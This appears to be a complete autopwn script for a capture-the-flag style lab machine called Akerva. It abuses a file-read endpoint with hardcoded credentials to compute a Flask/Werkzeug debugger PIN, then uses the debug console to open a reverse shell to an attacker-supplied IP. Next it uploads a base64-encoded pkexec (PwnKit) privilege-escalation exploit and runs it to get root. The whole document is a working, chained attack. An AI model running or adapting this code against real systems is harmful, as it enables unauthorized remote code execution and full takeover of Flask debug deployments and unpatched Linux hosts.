import hashlib, requests
from itertools import chain
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Akerva ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\çn")
    exit(1)

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

ip = sys.argv[1]

target = "http://10.13.37.11:5000/"
headers = {"Authorization":"Basic YWFzOkFLRVJWQXsxa24wd19IMHdfVE9fJENyMXBfVF8kJCQkJCQkJH0="}
reqa = requests.get(target + "file?filename=/etc/machine-id", headers=headers)
reqb = requests.get(target + "file?filename=/sys/class/net/ens33/address", headers=headers)
respa = reqa.text
respb = reqb.text
macid = respa.rstrip('\n')
addrsa = respb.rstrip('\n')
addrsb = ''.join(char for char in addrsa if char.isalnum())
addrss = int(addrsb, 16)

probably_public_bits = [ 'aas', 'flask.app', 'Flask', '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' ]
private_bits = [f'{addrss}', f'{macid}' ]
h = hashlib.md5()

for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
        pin = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                      for x in range(0, len(num), group_size))
        break

def cmd():
    sess = requests.Session()
    pinlog = f"/console?__debugger__=yes&cmd=pinauth&pin={pin}&s=kClUdGmXhfmveceMvENZ"
    sess.get(target + pinlog)
    time.sleep(1)
    revshl = f'console?__debugger__=yes&cmd=import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);&frm=0&s=kClUdGmXhfmveceMvENZ'
    sess.get(target + revshl)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=30).wait_for_connection()
shell.sendline(b"export TERM=xterm")
payload = (b"aW1wb3J0IGJhc2U2NCxvcyxzeXMKZnJvbSBjdHlwZXMgaW1wb3J0ICoKZnJvbSBjdHlwZXMudXRp\nbCBpbXBvcnQgZmluZF9saWJyYXJ5CgpwYXlsb2FkX2I2NCA9IGIiZjBWTVJnSUJBUUFBQUFBQUFB\nQUFBQU1BUGdBQkFBQUFrZ0VBQUFBQUFBQkFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFBRUFBT0FB\nQ1xuQUVBQUFnQUJBQUVBQUFBSEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQXJ3\nRUFBQUFBQUFETUFRQUFBQUFBQUFBUVxuQUFBQUFBQUFBZ0FBQUFjQUFBQXdBUUFBQUFBQUFEQUJB\nQUFBQUFBQU1BRUFBQUFBQUFCZ0FBQUFBQUFBQUdBQUFBQUFBQUFBQUJBQVxuQUFBQUFBQUJBQUFB\nQmdBQUFBQUFBQUFBQUFBQU1BRUFBQUFBQUFBd0FRQUFBQUFBQUdBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFJQUFBQVxuQUFBQUFBY0FBQUFBQUFBQUFBQUFBQU1BQUFBQUFBQUFBQUFBQUpBQkFBQUFBQUFB\na0FFQUFBQUFBQUFDQUFBQUFBQUFBQUFBQUFBQVxuQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF3\nQUFBQUFBQUFBa2dFQUFBQUFBQUFGQUFBQUFBQUFBSkFCQUFBQUFBQUFCZ0FBQUFBQVxuQUFDUUFR\nQUFBQUFBQUFvQUFBQUFBQUFBQUFBQUFBQUFBQUFMQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\nQUFBQUFBQUFBQUFBQVxuQUFBQVNESC9hbWxZRHdWSXVDOWlhVzR2YzJnQW1WQlVYMUplYWp0WUR3\nVT0iCgpwYXlsb2FkID0gYmFzZTY0LmI2NGRlY29kZShwYXlsb2FkX2I2NCkKCmVudmlyb24gPSBb\nCiAgICAgICAgYidleHBsb2l0JywKICAgICAgICBiJ1BBVEg9R0NPTlZfUEFUSD0uJywKICAgICAg\nICBiJ0xDX01FU1NBR0VTPWVuX1VTLlVURi04JywKICAgICAgICBiJ1hBVVRIT1JJVFk9Li4vTE9M\nJywKICAgICAgICBOb25lCl0KCnRyeToKICAgIGxpYmMgPSBDRExMKGZpbmRfbGlicmFyeSgnYycp\nKQpleGNlcHQ6CiAgICBzeXMuZXhpdCgpCgp0cnk6CiAgICB3aXRoIG9wZW4oJ3BheWxvYWQuc28n\nLCAnd2InKSBhcyBmOgogICAgICAgIGYud3JpdGUocGF5bG9hZCkKZXhjZXB0OgogICAgc3lzLmV4\naXQoKQpvcy5jaG1vZCgncGF5bG9hZC5zbycsIDBvMDc1NSkKCnRyeToKICAgIG9zLm1rZGlyKCdH\nQ09OVl9QQVRIPS4nKQpleGNlcHQgRmlsZUV4aXN0c0Vycm9yOgogICAgcHJpbnQoJycpCmV4Y2Vw\ndDoKICAgIHN5cy5leGl0KCkKCnRyeToKICAgIHdpdGggb3BlbignR0NPTlZfUEFUSD0uL2V4cGxv\naXQnLCAnd2InKSBhcyBmOgogICAgICAgIGYud3JpdGUoYicnKQpleGNlcHQ6CiAgICBzeXMuZXhp\ndCgpCm9zLmNobW9kKCdHQ09OVl9QQVRIPS4vZXhwbG9pdCcsIDBvMDc1NSkKCnRyeToKICAgIG9z\nLm1rZGlyKCdleHBsb2l0JykKZXhjZXB0IEZpbGVFeGlzdHNFcnJvcjoKICAgIHByaW50KCcnKQpl\neGNlcHQ6CiAgICBzeXMuZXhpdCgpCgp0cnk6CiAgICB3aXRoIG9wZW4oJ2V4cGxvaXQvZ2NvbnYt\nbW9kdWxlcycsICd3YicpIGFzIGY6CiAgICAgICAgZi53cml0ZShiJ21vZHVsZSAgVVRGLTgvLyAg\nICBJTlRFUk5BTCAgICAuLi9wYXlsb2FkICAgIDJcbicpOwpleGNlcHQ6CiAgICBzeXMuZXhpdCgp\nCgplbnZpcm9uX3AgPSAoY19jaGFyX3AgKiBsZW4oZW52aXJvbikpKCkKZW52aXJvbl9wWzpdID0g\nZW52aXJvbgoKbGliYy5leGVjdmUoYicvdXNyL2Jpbi9wa2V4ZWMnLCBjX2NoYXJfcChOb25lKSwg\nZW52aXJvbl9wKQo=")
shell.sendline(b"cd /dev/shm; echo '%s' | base64 -d > exploit.py" % (payload))
time.sleep(0.5)
shell.sendline(b"python3 exploit.py")
time.sleep(0.5)
shell.sendline(b"export HOME=/root TERM=xterm; cd; sudo su")
time.sleep(0.2)
shell.sendline(b"echo $(id)")
shell.interactive()
